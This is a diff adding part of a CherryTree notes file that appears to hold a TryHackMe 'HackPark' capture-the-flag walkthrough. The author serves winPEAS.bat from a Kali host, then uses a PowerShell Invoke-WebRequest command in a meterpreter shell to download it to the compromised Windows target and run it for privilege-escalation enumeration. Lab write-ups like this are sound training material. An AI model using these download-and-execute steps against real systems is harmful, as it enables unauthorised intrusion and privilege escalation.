+# We use wget here to get the file down and then we ls real quick to make sure it has come down and it has.
+
+# This is going to all come down to where you saved the file and what you save it as. WinPEAS.bat is a work around for windows machines that won't run winPEAS.exe
+# from the same directory we downloaded WinPEAS.bat we are going to host another python SimpleHTTPServer like so.
+
+	┌──(root💀kali)-[/opt]
+	└─# python -m SimpleHTTPServer
+	Serving HTTP on 0.0.0.0 port 8000 ...
+
+# we are now serving winPEAS.bat up on port 8000 just like we did earlier.
+
+# Now time to switch back to our terminal with the meterpreter shell up.
+
+	meterpreter&gt; 
+	meterpreter&gt; shell              # we are going to drop into a shell. Because it is easier to for me to invoke stuff using powershell
+# so our prompt changes to
+Process 964 created.
+channel 1 created.
+Microsoft Windows[Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+  c:\Windows\Temp&gt;powershell -c "Invoke-WebRequest -Uri '</rich_text>
+    <rich_text link="webs http://10.13.7.111:8000/winPEAS.bat'">http://10.13.7.111:8000/winPEAS.bat'</rich_text>
+    <rich_text> -Outfile 'C:\Windows\Temp\winpeas.bat'"	
+	
+
+	Again the URI specifying our local IP with the port 8000 where we are serving up WinPEAS.bat
+	And with the same powershell command/method we are able to get WinPEAS.bat over to the Target/Remote/Victim Machine
+	DONT forget your QUOTES! They seperate the commands.
+# NOTE: This may take a few seconds to pull over so be patient.
+
+
+c:\Windows\Temp&gt;powershell -c "Invoke-WebRequest -Uri '</rich_text>
+    <rich_text link="webs http://10.13.7.111:8000/winPEAS.bat'">http://10.13.7.111:8000/winPEAS.bat'</rich_text>
+    <rich_text> -Outfile 'C:\Windows\Temp\winpeas.bat'"
+powershell -c "Invoke-WebRequest -Uri '</rich_text>
+    <rich_text link="webs http://10.13.7.111:8000/winPEAS.bat'">http://10.13.7.111:8000/winPEAS.bat'</rich_text>
+    <rich_text> -Outfile 'C:\Windows\Temp\winpeas.bat'"
+
+c:\Windows\Temp&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+
+ Directory of c:\Windows\Temp
+
+03/11/2022  10:17 AM    &lt;DIR&gt;          .
+03/11/2022  10:17 AM    &lt;DIR&gt;          ..
+08/06/2019  01:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
+08/06/2019  01:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
+08/06/2019  01:13 PM             1,206 cleanup.txt
+08/06/2019  01:13 PM               421 cmdout
+08/06/2019  01:11 PM                 0 DMI2EBC.tmp
+08/03/2019  09:43 AM                 0 DMI4D21.tmp
+08/06/2019  01:12 PM             8,743 EC2ConfigService_20190806141221.log
+08/06/2019  01:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
+03/11/2022  09:50 AM    &lt;DIR&gt;          Microsoft
+03/11/2022  10:05 AM                 0 powershell
+03/11/2022  09:53 AM            73,802 shell.exe
+08/06/2019  01:13 PM                21 stage1-complete.txt
+08/06/2019  01:13 PM            28,495 stage1.txt
+05/12/2019  08:03 PM           113,328 svcexec.exe
+08/06/2019  01:13 PM                67 tmp.dat
+03/11/2022  10:17 AM           428,203 winpeas.bat
+              15 File(s)      1,136,987 bytes
+               3 Dir(s)  39,123,128,320 bytes free
+
+c:\Windows\Temp&gt;
+
+	Once it comes over go ahead and type exit 
+
+c:\Windows\Temp&gt; exit
+exit
+	We will then get our meterpreter prompt back where we can run sysinfo like the room specifies in the instructions which gets us.
+''
+c:\Windows\Temp&gt;exit
+exit
+meterpreter &gt; sysinfo
+Computer        : HACKPARK
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter &gt; 
+
+..
+# The version number here is what we are after. pop that into the answers on Try hack Me
+# 	What is the name of the abnormal service running?
+# Windows 2012 R2 (6.3 Build 9600)
+</rich_text>
+    <node name="WinPEAS Executes" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="7" is_bold="0" foreground="" ts_creation="1647028782" ts_lastsave="1647028785">
+      <rich_text>======================================================================
+NEW STAGE
+Now it is time to run .\winpeas.bat
+Take your meterpreter session and drop back into a shell like so
+
+	meterpreter&gt; shell
+	Process 964 created.
+	channel 1 created.
+	Microsoft Windows[Version 6.3.9600]
+	(c) 2013 Microsoft Corporation. All rights reserved.
+
+c:\Windows\Temp&gt;.\winpeas.bat                *press enter 
+
+# now winpeas should run for us!
+# so when you get on a windows box you want to scroll up to check the running processes
+# Same thing on linux. when you run linPEAS.sh you will be looking for cron jobs and anything that runs automatically
+# we see alot of open ports but we are looking for processes</rich_text>
+    </node>
+  </node>
+</cherrytree>
